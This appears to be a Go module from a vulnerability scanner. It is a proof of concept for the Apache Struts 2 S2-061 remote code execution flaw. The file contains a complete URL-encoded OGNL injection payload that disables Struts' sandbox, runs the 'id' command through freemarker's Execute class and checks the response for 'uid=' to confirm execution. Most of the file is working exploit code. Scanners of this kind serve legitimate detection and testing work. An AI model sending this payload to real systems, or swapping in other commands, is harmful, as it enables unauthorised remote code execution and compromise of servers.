package pocs

import (
	"bytes"
	"context"
	"heaven/app/APVE/pkg/common/requests"
	poc "heaven/app/APVE/pkg/protocols"
)

type Struts_2061 struct {
	vulId  string
	name   string
	desc   string
	status bool
	finger string
	data   string
}

func init() {
	var st Struts_2061 = Struts_2061{}
	st.vulId = "VPE-2021-10002"
	st.name = "struts2_061"
	st.desc = "Struts 2.0.0-Struts 2.5.25存在远程代码执行漏洞"
	st.finger = "struts"
	poc.AddPocObj(&st)
}

func (st *Struts_2061) PocExec(vulUrl string) map[string]interface{} {
	result := make(map[string]interface{},0)
	payload := "/?id=%25%7b(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application%5b%27org.apache.to" +
		"mcat.InstanceManager%27%5d).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%2" +
		"7)).(%23stackvalue%3d%23attr%5b%27struts.valueStack%27%5d).(%23potats0.setBean(%23stackvalue)).(%23context%3d%2" +
		"3potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23" +
		"emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27e" +
		"xcludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23Unic" +
		"odeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d%7b%27id%27%7d).(%23res%3d%23exec.exec" +
		"(%23cmd))%7d"
	vulUrl = vulUrl + payload
	headers := map[string]string{
		"User-Agent":                "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
		"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
		"Accept-Language":           "en-US,en;q=0.5",
		"Accept-Encoding":           "gzip, deflate",
		"Connection":                "close",
		"Upgrade-Insecure-Requests": "1",
		"Cache-Control":             "max-age=0",
	}
	res, err := requests.Get(context.Background(), vulUrl, requests.WithHeaders(headers))
	if err != nil {

	}
	response, err := res.Text()
	if err != nil {
	}
	if bytes.Contains([]byte(response),[]byte("uid=")) {
		st.data = response
		st.status = true
		result["vulId"] = st.vulId
		result["name"] = st.name
		result["desc"] = st.desc
		result["data"] = st.data
		result["status"] = st.status
	}
	return result
}

func (st *Struts_2061) GetPocInfo() map[string]string {
	info := make(map[string]string)
	info["vulId"] = st.vulId
	info["finger"] = st.finger
	return info
}
